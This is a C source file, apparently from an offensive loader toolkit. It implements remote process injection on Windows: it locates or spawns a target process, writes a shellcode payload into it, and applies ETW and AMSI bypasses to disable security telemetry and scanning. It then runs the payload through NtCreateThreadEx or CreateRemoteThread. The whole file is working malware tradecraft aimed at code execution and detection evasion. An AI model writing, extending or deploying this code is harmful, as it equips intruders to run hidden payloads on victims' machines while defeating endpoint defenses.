#include "injectors.h"


BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
	PVOID		pShellcodeAddress			= NULL;
	SIZE_T		sOriginalSize				= sPayloadSize;
	SIZE_T		sNumberOfBytesWritten		= 0;
	DWORD		dwProcessId				    = 0;
	DWORD		dwOldProtection				= 0;
	NTSTATUS	status						= STATUS_SUCCESS;
	HANDLE		hThread						= NULL;
	HANDLE hStdOutRead = NULL, hStdOutWrite = NULL;
	HANDLE hStdErrRead = NULL, hStdErrWrite = NULL;

#if defined(REDIRECT_OUTPUT)
    SECURITY_ATTRIBUTES  saAttr;
	PROCESS_INFORMATION pi;
    STARTUPINFO si;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)){
        DebugPrint("StdoutRd CreatePipe: %d\n", GetLastError());
		return FALSE;
	}

	if (!CreatePipe(&hStdErrRead, &hStdErrWrite, &saAttr, 0))
		DebugPrint("StderrRd CreatePipe: %d\n", GetLastError());

    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0);
	
	CreateRunningProcess(szProcessName, &dwProcessId, &hProcess, &hThread, hStdOutWrite, hStdErrWrite);
#else
	WDebugPrint(L"[i] Searching For Process Id Of \"%s\" ...\n", szProcessName);

	if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		DebugPrint("[!] Process is Not Found \n");
		return -1;
	}
#endif

	DebugPrint("[+] DONE\n");
	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);
	DebugPrint("[i] Target process handle: 0x%p\n", hProcess);

	DebugPrint("[i] Writing Shellcode To The Target Process ...\n");
	if (!payload_loading(&pShellcodeAddress, pPayload, sPayloadSize, hProcess, szProcessName)) {
		return FALSE;
	}
	
	//	apply ETW bypass
	if (!applyEtwBypass(hProcess)) {
		DebugPrint("[!] Failed To Apply ETW Bypass \n");
		return FALSE;
	}

	//	apply AMSI bypass
	if (!applyAmsiBypass(hProcess)) {
		DebugPrint("[!] Failed To Apply AMSI Bypass \n");
		CloseHandle(hThread);
		return FALSE;
	}

	// Running the shellcode as a new thread's entry in the remote process
	DebugPrint("[i] Executing Payload...\n");
#ifdef SYSCALL_ENABLED	
	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, FALSE, 0, (SIZE_T)0, (SIZE_T)0, NULL);
	if(!NT_SUCCESS(status)) {
		DebugPrint("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", status);
		return -1;
	}
#else
	if (CreateRemoteThread(hProcess, NULL, 0, pShellcodeAddress, NULL, 0, NULL) == NULL) {
		DebugPrint("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
#endif
	DebugPrint("[+] DONE !\n");

#if defined(REDIRECT_OUTPUT)
	ReadFromRemotePipe(hStdOutRead);
#endif

	CloseHandle(hProcess);
	CloseHandle(hThread);
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);

	return TRUE;
}